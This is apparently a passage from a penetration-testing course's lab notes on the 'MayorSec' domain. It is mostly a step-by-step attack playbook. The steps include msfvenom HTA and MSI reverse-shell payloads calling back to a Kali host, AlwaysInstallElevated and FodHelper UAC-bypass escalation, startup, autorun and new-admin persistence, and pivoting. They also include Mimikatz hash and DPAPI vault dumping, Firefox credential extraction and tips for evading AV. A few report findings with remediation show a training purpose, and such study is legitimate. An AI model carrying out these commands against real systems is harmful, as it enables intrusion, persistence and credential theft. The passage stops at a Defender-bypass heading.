+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;kali ip&gt; <span class="nt">-f</span> hta-psh <span class="nt">-o</span> file.hta
+use multi/handler <span class="o">&gt;</span> <span class="nb">set </span>options
+
+python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>make sure the link inside the email, is poiting to our kali ip/file.hta
+when the file is opened - we should get a meterpreter shell</p>
+
+<blockquote>
+  <p>everything works the same, but we are hosting the file via python web server and our listener is meterpreter</p>
+</blockquote>
+
+<h2 id="password-spraying-finding">Password Spraying Finding</h2>
+
+<p>Description:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ABC Organization enables poor password policies in the Roundcube e-mail service which allowed For Account compromise via password spraying.
+</code></pre></div></div>
+
+<p>Remediation:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Require the use of strong password on the Roundcube email server.
+Refer to organizational password policies \for guidance and to ensure policies meet industry best practices.
+</code></pre></div></div>
+
+<h3 id="email-phishing-finding">Email Phishing Finding</h3>
+
+<p>Description:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ABC Organization allowed the compromise of user workstation in the MayorSec domain through succesful e-mail phishing emails. Emails bypassed AV restrictions due to user disabling services.
+</code></pre></div></div>
+
+<p>Remediation:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Conduct training no less than two times a year that includes identification of suspicious emails, links and attachments.
+Generate a domain-wide Group Policy Object that prevents local users from disabling anti-virus on devices.
+</code></pre></div></div>
+
+<h1 id="enumeration-the-local-machine-privilege-escalation-and-local-persistence">Enumeration the Local Machine, Privilege Escalation and Local Persistence</h1>
+
+<h2 id="local-enumeration">Local Enumeration</h2>
+
+<h3 id="with-covenant">With Covenant</h3>
+<p>in the Covenant shell:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">seatbelt</span><span class="w"> </span><span class="nt">-group</span><span class="o">=</span><span class="n">all</span><span class="w">
+
+</span><span class="n">GetDomainUser</span><span class="w">
+</span><span class="nx">GetNetLoggedOnUser</span><span class="w">
+</span><span class="n">GetNetLocalGroup</span><span class="w">
+</span><span class="nx">LocalUsers</span><span class="w">
+</span><span class="n">GetDomainComputer</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="with-metasploit">With Metasploit</h3>
+<p>in meterpreter shell:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sysinfo</span><span class="w">
+</span><span class="nx">getuid</span><span class="w">
+</span><span class="n">ipconfig</span><span class="w">
+</span><span class="nx">arp</span><span class="w">
+</span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w">
+</span><span class="n">run</span><span class="w"> </span><span class="nx">post/windows/gather/enum_services</span><span class="w">
+</span><span class="n">run</span><span class="w"> </span><span class="nx">post/windows/gather/enum_applications</span><span class="w">
+</span><span class="n">run</span><span class="w"> </span><span class="nx">post/windows/gather/enum_domains</span><span class="w">
+</span><span class="n">route</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="autologon-misconfiguration-and-exploitation">AutoLogon Misconfiguration and Exploitation</h2>
+
+<h3 id="workstation-01">Workstation-01</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\AutoAdminLogon &gt; set 1</span>
+
+New <span class="o">&gt;</span> String Value <span class="o">&gt;</span> DefaultUserName <span class="o">&gt;</span> <span class="nb">set </span>s.chisholm
+New <span class="o">&gt;</span> String Value <span class="o">&gt;</span> DefaultPassword <span class="o">&gt;</span> <span class="nb">set </span>FallOutBoy1!
+New <span class="o">&gt;</span> String Value <span class="o">&gt;</span> DefaultDomainName <span class="o">&gt;</span> <span class="nb">set </span>mayorsec
+restart the machine
+</code></pre></div></div>
+
+<h3 id="covenant">Covenant</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Create a listener with there is not one
+Launcher <span class="o">&gt;</span> Powershell <span class="o">&gt;</span> <span class="nb">set </span>options <span class="o">&gt;</span> copy the payload
+</code></pre></div></div>
+
+<h3 id="workstation-01-1">Workstation-01</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-Sta</span><span class="w"> </span><span class="nt">-Nop</span><span class="w"> </span><span class="nt">-Window</span><span class="w"> </span><span class="nx">Hidden</span><span class="w"> </span><span class="nt">-EncodedCommand</span><span class="w"> </span><span class="s2">"payload from covenant"</span><span class="w">
+</span><span class="n">this</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">generate</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">covenant</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="in-covenant-shell">In Covenant Shell</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PowerShellImport</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">browse</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">PowerUp.ps1</span><span class="w">
+</span><span class="n">powershell</span><span class="w"> </span><span class="nx">Invoke-AllChecks</span><span class="w">
+</span><span class="n">Seatbelt</span><span class="w"> </span><span class="nx">WindowsAutoLogon</span><span class="w">
+</span><span class="n">SharpUp</span><span class="w"> </span><span class="nx">audit</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="alwaysinstallelevated-misconfiguration-and-exploitation">AlwaysInstallElevated Misconfiguration and Exploitation</h2>
+
+<p>Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; set AlwaysInstallElevated to 1
+</code></pre></div></div>
+
+<p>Computer\HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; New &gt; Key &gt; Installer &gt; New &gt; Key &gt; DWORD (32-bit) Value &gt; AlwaysInstallElevated
+set AlwaysInstallElevated to 1
+</code></pre></div></div>
+
+<h3 id="in-covenant-shell-1">In Covenant Shell:</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sharpup</span><span class="w"> </span><span class="nx">audit</span><span class="w">
+</span><span class="n">PowerShellImport</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">browse</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">PowerUp.ps1</span><span class="w">
+</span><span class="n">powershell</span><span class="w"> </span><span class="nx">Invoke-AllChecks</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Here we are looking for <strong>AlwaysInstallElevated</strong> Registry Keys - HKLM | HKCU
+This vulnerability give us privilege escalation opportunity.</p>
+</blockquote>
+
+<blockquote>
+  <p>[*] Checking for <strong>AlwaysInstallElevated</strong> registry key…
+AbuseFunction : Write-UserAddMSI</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/exec <span class="nv">CMD</span><span class="o">=</span><span class="s2">"revshell payload from covenant"</span> <span class="nt">-f</span> msi <span class="nt">-o</span> installer.msi
+</code></pre></div></div>
+
+<p>In Covenant Shell:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload C:\Users\Public\installer.msi &gt; browse &gt; grab the installer.msi
+ChangeDirectory C:\Users\Public
+ls = to verify if your payload is here
+shell msiexec /quiet /qn /i installer.msi
+this should give us an elevated revshell with authority\system access
+</code></pre></div></div>
+
+<h3 id="with-metasploit-1">with Metasploit:</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># we can get a shell with:</span>
+multi/script/web_delivery
+
+<span class="c"># in meterpreter shell session:</span>
+getuid
+run post/multi/recon/local_exploit_suggester
+ctrl+z <span class="o">=</span> to background the session
+use exploit/windows/local/always_install_elevated
+<span class="nb">set </span>options
+exploit <span class="o">=</span> <span class="o">(</span> <span class="nt">-j</span> to run <span class="k">in </span>the background <span class="k">if </span>u want<span class="o">)</span>
+we get a authority<span class="se">\s</span>ystem shell
+ps <span class="o">=</span> to show processes
+</code></pre></div></div>
+
+<blockquote>
+  <p>we can migrate to a SessionID that has 1 as value &amp; is from authority\system = so we get more privileges
+usually winlogon.exe. Grab the PID of this process</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">migrate</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">PID</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">sysinfo</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>now we have a better shell</p>
+</blockquote>
+
+<h2 id="fodhelper-uac-bypass-with-covenant">FodHelper UAC Bypass with Covenant</h2>
+
+<p>FodHelper is a trusted WIndows binary, that u can use to bypass UAC
+we are going from local user to local administrator</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PowerShellImport &gt; browse &gt; helper.ps1
+powershell helper -custom "cmd.exe /c &lt;revshell payload from covenant&gt;"
+local user to local administrator shell
+
+# Launcher &gt; ShellCode &gt; Net40 &gt; Generate &gt; Download &gt; save the file
+</code></pre></div></div>
+
+<h3 id="covenant-1">Covenant</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Inject &gt; ProcessID ( PID of a SessionId &gt;0 that has system access, usually winlogon.exe )
+browse &gt; select our shellcode file
+# we should get authority\system access
+</code></pre></div></div>
+
+<h4 id="-extra-info">[+] Extra Info</h4>
+<p>So the level Integrity of the escalation went:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Medium: local user
+High: local admistrator
+System: authority\system 
+</code></pre></div></div>
+
+<h3 id="with-meterpreter">With Meterpreter</h3>
+<p>Get an initial shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run post/multi/recon/local_exploit_suggester
+use exploit/windows/local/bypassuac_dotnet_profiler
+<span class="nb">set </span>options
+exploit <span class="nt">-j</span>
+</code></pre></div></div>
+
+<p>Go to the new session:</p>
+
+<blockquote>
+  <p>we are <strong>local admin</strong> , lets escalate even more</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps <span class="o">=</span> to show processes
+</code></pre></div></div>
+
+<p>lets migrate to a process that has:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># SessionID=1 &amp; authority\system access
+migrate &lt;PID&gt; 
+# again, usually winlogon.exe its a good choice
+</code></pre></div></div>
+
+<h4>[+]</h4>
+
+<blockquote>
+  <p>You may not always get a machine that has SessionID=1 processes.</p>
+</blockquote>
+
+<blockquote>
+  <p>Keep in mind that perhaps you need to generate a new user, grant him administrator back access in the local machine.</p>
+</blockquote>
+
+<blockquote>
+  <p>And then you might need to log with that user to get SessionId=1</p>
+</blockquote>
+
+<h2 id="persistence">Persistence</h2>
+
+<h3 id="new-user-persistence">New User Persistence</h3>
+<p>in Covenant:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if </span>u have <span class="nb">local </span>admin access <span class="o">(</span>high integrity<span class="o">)</span> 
+shellcmd net <span class="nb">users</span> &lt;newuser&gt; &lt;password&gt; /add
+shell net <span class="nb">users</span> <span class="o">=</span> to see <span class="k">if </span>our user was created
+shell net localgroup administrators &lt;newuser&gt; /add
+</code></pre></div></div>
+
+<h3 id="startup-persistence">StartUp Persistence</h3>
+<p>In Covenant:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># we will need a local admin (high integrity) access too</span>
+Launcher <span class="o">&gt;</span> powershell <span class="o">&gt;</span> revshell <span class="o">&gt;</span> copy the encoded payload
+Grunts <span class="o">&gt;</span> click <span class="k">in </span>the session <span class="o">&gt;</span> Task <span class="o">&gt;</span> PersistStartup <span class="o">&gt;</span> <span class="nb">paste </span>de payload <span class="o">&gt;</span> name and click Task
+</code></pre></div></div>
+
+<blockquote>
+  <p>This will send the malicious file to the startup directory in the Windows targert machine
+it will give us shell back, even after restart</p>
+</blockquote>
+
+<p>To clean:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Just delete the file from startup directory
+</code></pre></div></div>
+
+<h3 id="autorun-persistence">Autorun Persistence</h3>
+<p>In Covenant:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># we will net a local admin (high integrity) access</span>
+Launcher <span class="o">&gt;</span> binary <span class="o">&gt;</span> Net40 <span class="o">&gt;</span> generate &amp; Download <span class="o">&gt;</span> save the file
+Grunts <span class="o">&gt;</span> click <span class="k">in </span>the high session <span class="o">&gt;</span> Task <span class="o">&gt;</span> PersistAutorun <span class="o">&gt;</span> copy the value path <span class="o">&gt;</span> 
+open a new tab <span class="o">&gt;</span> click <span class="k">in </span>the shell of the high session <span class="o">&gt;</span> upload <span class="o">&gt;</span> <span class="nb">paste </span>the value path <span class="o">&gt;</span> <span class="k">select </span>the file
+now go back to the first tab and click Task to finish
+</code></pre></div></div>
+
+<blockquote>
+  <p>if u want to see the process in the target machine: 
+go to register &gt; HKCU\Software\Microsoft\windows\CurrentVersion\Run</p>
+</blockquote>
+
+<p>OR</p>
+
+<p>in covenant shell:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	GetRegistryKey HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+# this will show the register in the machine
+</code></pre></div></div>
+
+<blockquote>
+  <p>After restarting the target windows machine
+we should get a shell back in Covenant</p>
+</blockquote>
+
+<p>To clean:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>delete the register
+delete the autorun file in C:\Users\Public\autorun
+</code></pre></div></div>
+
+<h3 id="persistence-via-rdp">Persistence via RDP</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Workstation-01 &gt; Remote Desktop Settings = off
+
+in Covenant shell:
+powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+</code></pre></div></div>
+
+<blockquote>
+  <p>This command enables Remote Desktop.</p>
+</blockquote>
+
+<p>In Kali:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /u:&lt;user&gt; /p:'password' /v:&lt;target ip&gt;
+</code></pre></div></div>
+
+<h4 id="-disable-the-firewall">[+] Disable the firewall</h4>
+
+<p>The RDP persistence is very valuable, because it give us a GUI. So its easy to look.</p>
+
+<p>In case you want disable the firewall rule, its the same command but change the</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{/d 0 -&gt; /d 1} and {Enable-NetFirewallRule -&gt; Disable-NetFirewallRule}
+</code></pre></div></div>
+
+<p>Disable the firewall rule:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nx">reg</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="s2">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">fDenyTSConnections</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_DWORD</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">/f</span><span class="p">;</span><span class="w"> </span><span class="n">Disable-NetFirewallRule</span><span class="w"> </span><span class="nt">-DisplayGroup</span><span class="w"> </span><span class="s2">"Remote Desktop"</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="port-forward">Port Forward</h2>
+
+<h3 id="session-passing-to-metasploit">Session Passing to Metasploit</h3>
+
+<blockquote>
+  <p>if we have a session in covenant of any integrity and need to use port forwarding, autoroute etc
+we can pass the session to the metasploit, because covenant does not have that functionality</p>
+</blockquote>
+
+<p>msfconsole:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search web_delivery
+use exploit/multi/script/web_delivery
+set target 2 = powershell
+set payload windows/x64/meterpreter/reverse_http 
+set others options
+exploit -j
+copy the payload
+</code></pre></div></div>
+
+<blockquote>
+  <p>the <strong>reverse_http</strong> its better than <strong>reverse_tcp</strong> to evade detection</p>
+</blockquote>
+
+<p>Go to Covenant Shell:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">paste</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">payload</span><span class="err">&gt;</span><span class="w">
+</span><span class="c"># this will give a session to metasploit</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="routing-functions">Routing Functions</h3>
+<p>In meterpreter session:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ipconfig # to see which route we wanna open
+run autoroute -s &lt;192.168.16.0/24&gt;
+run autoroute -p # to check the routes
+</code></pre></div></div>
+
+<h3 id="port-forwarding">Port Forwarding</h3>
+
+<blockquote>
+  <p>The Traffic sent from inside the network that we dont have access, can be forward to a device that we do have access back to our kali machine.</p>
+</blockquote>
+
+<p>In meterpreter session:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>portfwd add <span class="nt">-R</span> <span class="nt">-p</span> 1234 <span class="nt">-l</span> 443 <span class="nt">-L</span> &lt;kali ip&gt;
+
+<span class="c"># -R = reverse</span>
+<span class="c"># -p = port of target machine, doest not matter</span>
+<span class="c"># -l = port in our kali</span>
+<span class="c"># -L = listening host = kali ip</span>
+
+portfwd  <span class="c"># to show the total active port forwards</span>
+ctrl + z <span class="c"># background the session </span>
+</code></pre></div></div>
+
+<h3 id="socks">SOCKS</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search socks
+use auxiliary/server/socks4a
+<span class="nb">cat</span> /etc/proxychains4.conf <span class="o">&gt;</span> copy the port <span class="k">in </span>the socks4 line
+example: socks4 127.0.0.1 9050
+<span class="nb">set </span>the port we check <span class="k">in </span>proxychains4
+exploit <span class="nt">-j</span>
+
+<span class="nb">jobs
+jobs</span> <span class="nt">-k</span> &lt;number&gt; <span class="o">=</span> <span class="k">if </span>u want to <span class="nb">kill 
+
+</span>portfwd <span class="c"># pay attention to the info</span>
+example : &lt;kali ip&gt;:443   0.0.0.0:1234
+
+<span class="c"># Go to covenant &amp; create a listener to interact with that port forward</span>
+Listeners <span class="o">&gt;</span> <span class="nv">name</span><span class="o">=</span>Reverse HTTP <span class="o">&gt;</span> <span class="nv">BindPort</span><span class="o">=</span>443 <span class="o">&gt;</span> <span class="nv">ConnectPort</span><span class="o">=</span>1234 <span class="o">&gt;</span> <span class="nv">ConnectAddresses</span><span class="o">=</span>target ip
+Create
+</code></pre></div></div>
+
+<blockquote>
+  <p>To visualize: go to msfconsole &gt; netstat -ano
+there is a service 0.0.0.0:1234 LISTEN powershell.exe
+that service will capture the traffic and push off over to our kali machine</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Launchers <span class="o">&gt;</span> powershell <span class="o">&gt;</span> reverse http <span class="o">&gt;</span> Net40 <span class="o">&gt;</span> Generate
+Host <span class="o">&gt;</span> /rev.ps1 <span class="o">&gt;</span> click host <span class="o">&gt;</span> copy the encoded payload
+</code></pre></div></div>
+
+<h4 id="poc">POC</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Go to workstation-02, that we do not have directly access.
+- disable AV 
+- paste the payload, we should get a session in Covenant
+</code></pre></div></div>
+
+<blockquote>
+  <p>If u try to generate again without port forward this will not work</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Launchers &gt; Generate HTTP Listener &gt; Host &gt; rev.ps1 - host &gt; copy encoded payload 
+try to execute in the workstation-02
+</code></pre></div></div>
+
+<h3 id="proxychains">ProxyChains</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains evil-winrm <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">-i</span> &lt;ip of workstation-02&gt;
+
+<span class="c"># we get a shell</span>
+<span class="c"># without the portfwd in the meterpreter, this will not work </span>
+</code></pre></div></div>
+
+<h2 id="workstation-dominance">Workstation Dominance</h2>
+
+<h3 id="dumping-hashes">Dumping Hashes</h3>
+<p>You need a high integrity Covenant Shell
+if you are not authority\system we need to run token::elevate</p>
+
+<p><strong>Mimikatz in Covenant Shell</strong>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mimikatz token::elevate lsadump::secrets
+</code></pre></div></div>
+
+<blockquote>
+  <p>Here we are looking for plain text credentials</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Mimikatz token::elevate lsadump::sam
+</code></pre></div></div>
+
+<blockquote>
+  <p>Here we want hashes
+Covenant store the hashes we found in Data - Credentials</p>
+</blockquote>
+
+<p><strong>Metasploit</strong>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run post/windows/gather/win_privs
+getsystem
+getuid
+
+<span class="c"># if u are authority\system:</span>
+hashdump <span class="o">&gt;</span> grab to crack later
+load kiwi <span class="c"># to use mimikatz in meterpreter</span>
+<span class="nb">help</span> <span class="c"># to see available commands</span>
+
+creds_all
+lsa_dump_sam
+lsa_dump_secrets
+</code></pre></div></div>
+
+<h3 id="cracking-credentials">Cracking Credentials</h3>
+
+<p><strong>Hashcat</strong>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat.exe <span class="nt">-a</span> 0 <span class="nt">-m</span> 1000 &lt;<span class="nb">hash</span><span class="o">&gt;</span> <span class="nt">-r</span> &lt;rule file&gt; &lt;wordlist&gt;
+
+<span class="c"># -m 1000 = NTLM</span>
+</code></pre></div></div>
+
+<p>→ https://hashcat.net/wiki/doku.php?id=example_hashes</p>
+
+<p>→ https://github.com/NotSoSecure/password_cracking_rules</p>
+
+<p><strong>Cracking Vault with Covenant</strong>:</p>
+
+<p>First enable RDP in DC.</p>
+
+<p>in Workstation-01:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Control Panel<span class="se">\U</span>ser Accounts<span class="se">\C</span>redential Manager
+</code></pre></div></div>
+
+<blockquote>
+  <p>If someone log in the DC For example, the credential will be stored in the credential manager.
+We cant see the password, but its stored there… What that means? means that we can get.</p>
+</blockquote>
+
+<p>In Covenant Shell:
+Workstation-01 - medium integrity:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz vault::cred
+</code></pre></div></div>
+
+<p>To find where the credentials are:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls </span>c:<span class="se">\u</span>sers<span class="se">\&lt;</span>user.domain&gt;<span class="se">\a</span>ppdata<span class="se">\l</span>ocal<span class="se">\m</span>icrosoft<span class="se">\c</span>redentials
+grab the full path
+</code></pre></div></div>
+
+<p>Open another Covenant Shell in a new tab:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Grunts <span class="o">&gt;</span> shell <span class="o">&gt;</span> Task <span class="o">&gt;</span> Mimikatz <span class="o">&gt;</span> <span class="s2">"dpapi::cred /in:&lt;paste full path from credentials&gt;"</span> <span class="o">&gt;</span> Task
+grab the guidMasterKey
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls </span>C:<span class="se">\u</span>sers<span class="se">\&lt;</span>user.domain&gt;<span class="se">\a</span>ppdata<span class="se">\r</span>oaming<span class="se">\m</span>icrosoft<span class="se">\p</span>rotect
+<span class="c"># then ls the full path result</span>
+<span class="c"># this should show the guidMasterKey &gt; copy the full path &amp; compare with the guidMasterKey from before</span>
+
+Grunts <span class="o">&gt;</span> shell <span class="o">&gt;</span> Task <span class="o">&gt;</span> Mimikatz <span class="o">&gt;</span> <span class="s2">"dpapi::masterkey /in:&lt;full path of guidMasterKey&gt; /rpc"</span> <span class="o">&gt;</span> Task
+
+<span class="c"># rpc = remote procedure call</span>
+<span class="c"># in the end of the output we should find the key value of DC &gt; copy &amp; save the key</span>
+
+<span class="c"># Go back to Task &gt; "dpapi::cred /in:&lt;full path of credentials&gt; /masterkey:&lt;key value&gt;" &gt; Task</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>This will dump the plain text password of the account that was stored in Credential Manager
+In this case, its the DC.</p>
+</blockquote>
+
+<p><strong>Cracking Vault via Metasploit</strong></p>
+
+<p>in meterpreter shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload &lt;mimikatz.exe&gt; C:<span class="se">\\</span>Users<span class="se">\\</span>Public<span class="se">\\</span>mimikatz.exe
+shell
+<span class="nb">cd </span>c:<span class="se">\u</span>sers<span class="se">\p</span>ublic
+
+<span class="nb">dir</span> /a C:<span class="se">\u</span>sers<span class="se">\&lt;</span>user.domain&gt;<span class="se">\a</span>ppdata<span class="se">\l</span>ocal<span class="se">\m</span>icrosoft<span class="se">\c</span>redentials
+<span class="c"># it should show the key path</span>
+
+mimikatz.exe
+vault::cred
+
+dpapi::cred /in:&lt;credential path&gt;<span class="se">\&lt;</span>key path&gt;
+<span class="c"># it should show the guidMasterKey</span>
+<span class="nb">exit</span> <span class="o">(</span>mimikatz<span class="o">)</span>
+
+<span class="nb">dir</span> /a C:<span class="se">\u</span>sers<span class="se">\&lt;</span>user.domain&gt;<span class="se">\a</span>ppdata<span class="se">\r</span>oaming<span class="se">\m</span>icrosoft<span class="se">\p</span>rotect
+<span class="nb">dir</span> /a C:<span class="se">\u</span>sers<span class="se">\&lt;</span>user.domain&gt;<span class="se">\a</span>ppdata<span class="se">\r</span>oaming<span class="se">\m</span>icrosoft<span class="se">\p</span>rotect<span class="se">\&lt;</span>SID directory&gt;
+grab the guidMasterKey
+
+mimikatz.exe
+dpapi::masterkey /in:&lt;full path of guidMasterKey&gt; /rpc
+<span class="c"># it should show the master key value that we need to crack</span>
+
+dpapi::cred /in:&lt;full path of credentials&gt; /masterkey:&lt;key value&gt;
+<span class="c"># it dumps the password</span>
+</code></pre></div></div>
+
+<h4 id="-101">[+] 101</h4>
+
+<p>It looks complicated but its not.</p>
+
+<p>There is 4 steps:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Get the key path:
+run <span class="nb">dir </span><span class="k">in </span>appdata<span class="se">\l</span>ocal<span class="se">\m</span>icrosoft<span class="se">\c</span>redentials
+
+2. Get the guidMasterKey full path:
+its <span class="k">in </span>appdata<span class="se">\r</span>oaming<span class="se">\m</span>icrosoft<span class="se">\p</span>rotect<span class="se">\&lt;</span>SID&gt;
+we just need to find the SID directory running DIR 
+
+3. Discover the key value:
+mimikatz.exe
+dpapi::masterkey /in:&lt;full path of guidMasterKey&gt; /rpc
+
+4. Crack the key value:
+dpapi::cred /in:&lt;full path of credentials&gt; /masterkey:&lt;key value&gt;
+</code></pre></div></div>
+
+<h3 id="dumping-firefox-credentials">Dumping Firefox Credentials</h3>
+<p>workstation-01 - first open firefox and save a credential of any site</p>
+
+<h4 id="metasploit">Metasploit</h4>
+<p>background your session</p>
+
+<p>search firefox:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use post/multi/gather/firefox_creds
+<span class="nb">set </span>session
+exploit <span class="nt">-j</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>it will save the firefox credentials dump in /root/.msf4/loot/</p>
+</blockquote>
+
+<p>We need to rename the dump files:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cert <span class="o">&gt;</span> cert9.db
+key4 <span class="o">&gt;</span> key4.db
+logi <span class="o">&gt;</span> logins.json
+cook <span class="o">&gt;</span> cookies.sqlite
+
+sign <span class="o">&gt;</span> signons.sqlite <span class="c"># optional</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/ git clone https://github.com/unode/firefox_decrypt
+./firefox_decrypt.py /root/.msf4/loot/
+# it will dump all the credentials saved in FIrefox
+</code></pre></div></div>
+
+<p>To check if firefox is in the machine and u may wanna try this exploit</p>
+
+<p>in meterpreter session:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run post/windows/gather/enum_applications
+</code></pre></div></div>
+
+<h2 id="bypassing-defender-with-fodhelper">Bypassing Defender with FodHelper</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Go to workstation-01
+- Enable all protection except Automatic sample Submission
+</code></pre></div></div>
+
